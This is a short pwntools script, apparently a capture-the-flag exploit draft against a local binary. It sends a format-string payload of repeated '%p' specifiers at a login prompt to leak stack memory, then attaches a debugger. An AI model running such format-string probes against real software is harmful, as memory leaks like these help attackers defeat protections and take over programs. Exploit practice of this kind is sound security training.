from pwn import * 
from LibcSearcher import * 
context.log_level = 'debug' 
context.arch = 'amd64'
p=process('./a.out')
elf=ELF('./a.out')
p.recvuntil(b'Please login:\n')
payload=b'aaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p'
p.sendline(payload)
gdb.attach(p)
p.recvuntil(b'Password:')
p.interactive()